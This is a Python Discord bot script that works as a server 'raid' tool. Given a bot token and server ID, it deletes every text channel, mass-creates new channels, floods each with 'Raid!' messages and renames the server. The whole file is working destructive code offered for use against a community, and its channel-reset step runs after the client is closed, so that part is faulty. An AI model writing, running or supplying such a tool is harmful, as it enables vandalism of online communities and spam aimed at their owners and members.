import discord
import asyncio
import os

def clear_screen():
    """Clears the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def bot_operation():
    """Main function to perform bot operations."""
    clear_screen()
    bot_token = input("Enter your bot token: ")
    guild_id = int(input("Enter the server ID: "))
    new_guild_name = input("Enter the new server name: ")
    new_channel_name = input("Enter the new channel name: ")
    num_channels = int(input("How many channels do you want to create? "))
    messages_per_channel = int(input("How many messages do you want to send per channel? "))

    intents = discord.Intents.default()
    intents.guilds = True
    intents.messages = True
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        """Event triggered when the bot is ready."""
        guild = client.get_guild(guild_id)
        await delete_channels(guild)
        channel_tasks = []
        for i in range(num_channels):
            channel_tasks.append(create_and_spam_channel(guild, i, messages_per_channel, new_channel_name))
        await asyncio.gather(*channel_tasks)
        await guild.edit(name=new_guild_name)
        await client.close()
        reset_prompt = input("Do you want to reset the channel names? (yes/no): ").lower()
        if reset_prompt == "yes":
            await reset_channel_names(guild)

    async def delete_channels(guild):
        """Deletes all text channels in the given guild."""
        for channel in guild.text_channels:
            try:
                await channel.delete()
            except discord.Forbidden:
                print(f"Failed to delete channel {channel.name}.")

    async def create_and_spam_channel(guild, channel_index, messages_count, channel_name):
        """Creates a text channel and sends messages in it."""
        new_channel = await guild.create_text_channel(f"{channel_name}-{channel_index}")
        message_tasks = [new_channel.send("Raid!") for _ in range(messages_count)]
        await asyncio.gather(*message_tasks)
        await new_channel.edit(name=f"~~{new_channel.name}~~")

    async def reset_channel_names(guild):
        """Resets channel names by removing the '~~' prefix."""
        for channel in guild.text_channels:
            if channel.name.startswith("~~"):
                try:
                    await channel.edit(name=channel.name.replace("~~", ""))
                except discord.Forbidden:
                    print(f"Failed to reset channel {channel.name}.")

    client.run(bot_token)

if __name__ == "__main__":
    bot_operation()
